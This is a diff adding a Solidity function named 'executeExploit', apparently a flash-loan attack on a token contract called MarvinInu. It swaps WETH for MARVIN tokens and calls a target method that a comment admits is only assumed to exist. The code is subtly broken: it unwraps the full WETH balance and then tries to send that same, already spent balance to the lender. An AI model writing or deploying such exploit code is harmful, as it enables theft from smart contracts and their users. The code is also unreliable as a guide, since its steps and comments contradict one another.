@@ -1,0 +1,44 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by getting the WETH contract address
+    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+
+    // Wrap some ETH to obtain WETH
+    weth.deposit{value: amount}();
+
+    // Transfer the wrapped WETH to the target contract
+    weth.approve(target, amount);
+
+    // Now perform a swap on the Uniswap pair for MARVIN tokens
+    address[] memory path = new address[](2);
+    path[0] = address(weth); // WETH token
+    path[1] = token; // MARVIN token
+
+    // Execute the swap
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount,
+        0, // Set this to 0, as we will accept any amount of tokens
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // At this point, we will have MARVIN tokens that we can use
+    uint256 marvinBalance = IERC20(token).balanceOf(address(this));
+    
+    // Approve the MARVIN tokens for the target contract
+    IERC20(token).approve(target, marvinBalance);
+
+    // Now execute the operation on the target contract which allows to earn WETH in return
+    IMarvinInu(target).makeProfit(marvinBalance); // Assuming there's a method like this in MarvinInu
+
+    // Finally, withdraw the WETH obtained
+    uint256 wethBalance = weth.balanceOf(address(this));
+    weth.withdraw(wethBalance); // This will send WETH back as ETH to the caller
+
+    // Transfer any remaining WETH back to the flashloan provider
+    weth.transfer(flashloanProvider, wethBalance);
+}
+</executeExploitCode>
+```
